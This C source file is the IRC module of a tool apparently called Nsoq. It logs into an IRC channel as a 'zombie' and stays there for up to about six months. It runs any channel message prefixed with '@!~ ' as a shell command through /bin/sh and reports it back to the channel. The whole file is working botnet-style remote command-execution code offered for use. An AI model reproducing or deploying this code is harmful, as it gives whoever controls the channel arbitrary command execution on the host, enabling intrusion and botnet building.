/*......,,,,,,,.............................................................
*
* @@NAME:     Module IRC
* @@VERSION:  1.0.3
* @@DESC:     IRC source file (this file is part of Nsoq tool).
* @@AUTHOR:   Felipe Ecker (Khun) <khun@hexcodes.org>
* @@DATE:     18/10/2012 16:30:00
* @@MANIFEST:
*      Copyright (C) Felipe Ecker 2003-2014.
*      You should have received a copy of the GNU General Public License 
*      inside this program. Licensed under GPL 3
*      If not, write to me an e-mail please. Thank you.
*
*...........................................................................
*/

#include "../include/core.h"

static struct __data _data;   /* Sender bulk */
static bool logged = false;
static uint16 oldSrcPort;
uint32 stream;

#define IRC_BUFF 2048

struct buffered {
   uchar buffer[IRC_BUFF];
   uint16 size;
} __packed__;

/* The PROCESS hell looping (Running on a dedicated threading) */
#if !defined(__BSD_SYSTEM__)
inline static void *__process( void *__raw ) {
#else
static void __process( void *__raw ) {
#endif

   register struct buffered *__irc = (struct buffered *) __raw;
   register uint16 size = __irc->size;
   register uchar *data = __irc->buffer;
   register uchar *__buff = (uchar *) calloc(1, IRC_BUFF);
   register uchar *__mem = __buff;

   /* Closing Link engine */
   if (!memcmp(data, "ERROR :", 7)) {
      log("[Server connection closed].\n");
      kill(getpid(), SIGALRM);
      goto __EXIT;
   } 

   char __send[2048];
   register uint16 it;
   register uint16 limit = 6;

   memcpy(__buff, "PONG :", 6);
   __buff += 6;
   char *__syscmd = (char *) __buff;
   
   for (it = 0; it < size; it++) {

      /* PING PONG engine */
      if (!memcmp(data, "PING :", 6)) {
         data += 6;
         do { 
            *__buff++ = *data; 
            limit++; 
         } while( (*data++ != 0x0A) && (limit < 48) );

         send(stream, __mem, limit, 0);
         break;
      }

      /* Main exec engine */
      if (!memcmp(data, "@!~ ", 4)) {
         data += 4;
         while( (*data != 0x0D) && (limit < IRC_BUFF) ) { 
            *__buff++ = *data++; 
            limit++;
         }

         snprintf(__send, sizeof(__send) - 1, 
         "PRIVMSG #%s :[Running] %s\r\n", pkt->ircRoom, __syscmd);
         send(stream, __send, strlen(__send), 0);

         show("\n\n[IRC] Running: %s\n\n", __syscmd);
         signal(SIGCHLD, SIG_IGN);
         if ( !fork() ) execl("/bin/sh", "sh", "-c" , __syscmd, NULL);
         break;
      }

      /* NAMES LIST engine */
      if (!memcmp(data, ":End of /NAMES list", 19)) {
         logged = true;
         break;
      }

      /* Up the buffer data */
      data++;
   }

   __EXIT:
   if (__mem) free(__mem);

#if !defined (__BSD_SYSTEM__)
   return NULL;
#endif
}


#if defined(__BSD_SYSTEM__)
static void __bsd_listen (  u_char *args,
                            const struct pcap_pkthdr *hdr,
                            const u_char *recvbuff )
{

   struct ip *ip      = (struct ip *) (recvbuff + SIZE_ETH);
   struct tcphdr *tcp = (struct tcphdr *) (recvbuff + SIZE_ETH+ SIZE_IP);

   if ( hardtrue((ip->ip_p != IPPROTO_TCP) ||
      (ip->ip_src.s_addr != _data.target->sin_addr.s_addr) || 
      (ntohs(tcp->th_sport) != pkt->port)) )
         goto __ROLLING;

   if ( (tcp->th_flags & TCP_FIN) && (ntohs(tcp->th_dport) != oldSrcPort)) {
      log("Connection closed by IRC server.\n\n");
      kill(getpid(), SIGALRM);
      goto __ROLLING;
   }

   register uint8 size_hdr = SIZE_ETH + SIZE_IP + SIZE_TCP;
   if ( (ntohs(ip->ip_len) < (SIZE_IP + SIZE_TCP)) ) goto __ROLLING;
   
   struct buffered irc;
   register uchar *data = (uchar *) (recvbuff + size_hdr);

   irc.size = ntohs(ip->ip_len) - (SIZE_IP + SIZE_TCP);
   memcpy(irc.buffer, data, irc.size);
   __process((void *) &irc);

   __ROLLING:
   pass;
}
#endif


#if !defined(WEAK_GCC)
__call__ inline static void *__packets_handler() {
#else
inline static void *__packets_handler() {
#endif

#if defined(__BSD_SYSTEM__)
   char *eth, err_buff[PCAP_ERRBUF_SIZE];

   if ( !(eth = pcap_lookupdev(err_buff)) ) {
      log("ERROR on grab system's interface. Exiting..\n\n");
      kill(getpid(), SIGALRM);
      goto __ENDING;
   }

   if ( !(__session = pcap_open_live(eth, IRC_BUFF, true, 1, err_buff)) ) {
      log("Couldn't open device %s: Detail: %s\n", eth, err_buff);
      kill(getpid(), SIGALRM);
      goto __ENDING;
   }

   pcap_loop(__session, -1, __bsd_listen, NULL);

#else
   register uint32 sock;
   /* TCP RAW socket */
   if ( !( sock = __socketPool(false, __TCP_MODE__, false)) ) return NULL;

   struct buffered irc;
   register uint16 size_hdr = SIZE_IP + SIZE_TCP + SIZE_AUX;

   uchar recvbuff[IRC_BUFF];
   memset(recvbuff, 0, IRC_BUFF);

   register uint16 size = IRC_BUFF;
   struct sockaddr_in remote;
   socklen_t _sizeof = sizeof(struct sockaddr_in);

   register struct iphdr *recvip = (struct iphdr *) recvbuff;
   register struct tcphdr *recvtcp = (struct tcphdr *) (recvbuff + SIZE_IP);
   register uchar *data = (uchar *) (recvbuff + size_hdr);

   __LOOP:
   if ( hardfalse(recvfrom(sock, recvbuff, size, 0, \
   (struct sockaddr *) &remote, &_sizeof) < 0) ) {
      log("ERROR on received IRC PINPONG data.\n\n");
      kill(getpid(), SIGALRM);
      goto __ENDING;
   }
   
   if ((recvip->protocol != IPPROTO_TCP) ||
      (recvip->saddr != _data.target->sin_addr.s_addr) ||
      (ntohs(recvtcp->source) != pkt->port)) goto __LOOP;

	if ( recvtcp->fin && (ntohs(recvtcp->dest) != oldSrcPort) ) {
      log("Connection closed by IRC server.\n\n");
      kill(getpid(), SIGALRM);
      goto __ENDING;

	}

   if ( (ntohs(recvip->tot_len) < size_hdr) ) goto __LOOP;

	irc.size = ntohs(recvip->tot_len) - size_hdr;
	memcpy(irc.buffer, data, irc.size);

   /* I'll threading each received packet. 
   I dont care about the spending processing time. */
   if ( !__threadPool(1, &__process, (void *) &irc) ) return NULL;
   goto __LOOP;

#endif
   __ENDING:
   return NULL;
}


#if !defined(WEAK_GCC)
__call__ inline static bool __doCheck( const uint8 _sleep ) {
#else
inline static bool __doCheck( const uint8 _sleep ) { 
#endif

   struct timeval _times;
   fd_set beep;
   _times.tv_sec = _sleep;
   _times.tv_usec = 2000;
   
   char buff[IRC_BUFF];
   memset(buff, 0, IRC_BUFF);

   FD_ZERO(&beep);
   FD_SET(stream, &beep);
   
   if ( !select(stream+1, &beep, NULL, NULL, &_times)) return false;
   recv(stream, buff, IRC_BUFF, 0);

   return true;
}


inline static void __run( void ) {

   /* TCP STREAM socket */
   if ( !( stream = __socketPool(false, __TCP_MODE__, true)) ) return;
   __set_nonblock(stream);

   register uint8 tsize = sizeof(struct sockaddr);
   register struct sockaddr_in *targ = _data.target;

   struct timeval _times;
   fd_set beep, wr;
   _times.tv_sec = 5;
   _times.tv_usec = 0;
   FD_ZERO(&beep);
   FD_ZERO(&wr);
   FD_SET(stream, &beep);
   FD_SET(stream, &wr);

   show("[IRC] Connecting to server (%s) on port %d..\n", pkt->dst,pkt->port);
   connect(stream, (struct sockaddr *) targ, tsize);

   if ( select(stream+1, &beep, &wr, NULL, &_times) != 1) {
      log("Unable to connect on IRC server. Offline or closed port ??\n");
      kill(getpid(), SIGALRM);
      return;
   }

   {
      struct sockaddr_in tmp;
      socklen_t len = tsize;
      getsockname(stream, (struct sockaddr *) &tmp, &len);
      oldSrcPort = ntohs(tmp.sin_port);
   }

   close(stream);
   sleep(4);
   show("[Done]\n\n");

   if ( !__threadPool(1, &__packets_handler, NULL)) return;

   show("[IRC] Now logging on channel (#%s)...\n", pkt->ircRoom);

   /* TCP STREAM socket */
   if ( !( stream = __socketPool(false, __TCP_MODE__, true)) ) return;
   connect(stream, (struct sockaddr *) targ, tsize);
   if (!__doCheck(20)) {
      log("Unable to loggin on server. Maybe it has a slow connection.\n");
      kill(getpid(), SIGALRM);
      return;
   }

   sleep(2);

   char auth[512];
   register uint32 ident = rand() % 0xFFFFFFFF;
   snprintf(auth, sizeof(auth) - 1, "NICK M-%08X\n\rUSER Nsoq-%04X Nsoq-%04X %s :NSOQ\n\r",
   ident, ident, ident, pkt->dst);

   send(stream, auth, strlen(auth), 0);
   if (!__doCheck(30)){
      log("Unable to logging on server. Maybe it has a slow connection.\n");
      kill(getpid(), SIGALRM);
      return;
   }

   uint8 retry = 3;
   snprintf(auth, sizeof(auth) - 1, "JOIN #%s %s\n\r", pkt->ircRoom, pkt->ircPass);
   sleep(6);

   do {
      send(stream, auth, strlen(auth), 0);
      sleep(1);
      if (logged) break;
      sleep(12);
   } while (retry--);

   if (!logged) {
      log("Unable to connect on channel #%s.\nTry again or check the IRC connection [maybe banned??]...\n\n", pkt->ircRoom);
      kill(getpid(), SIGALRM);
      return;
   }

   show("[Done]\n\n");
   show("[Zumbi Mode] Waiting for commands:\n");
   sleep(16070400); /* Time to Live: ~6 months. */
}


bool irc( const char **pull __unused__ ) {

   signal(SIGINT, __sigcatch);
   signal(SIGALRM, __sigcatch);
   logged = false;

   _data.target = (struct sockaddr_in *) addressbuff;
   if (!__lookup(_data.target, pkt->dst, pkt->port, false)) return false;

   __run();
   return true;
}

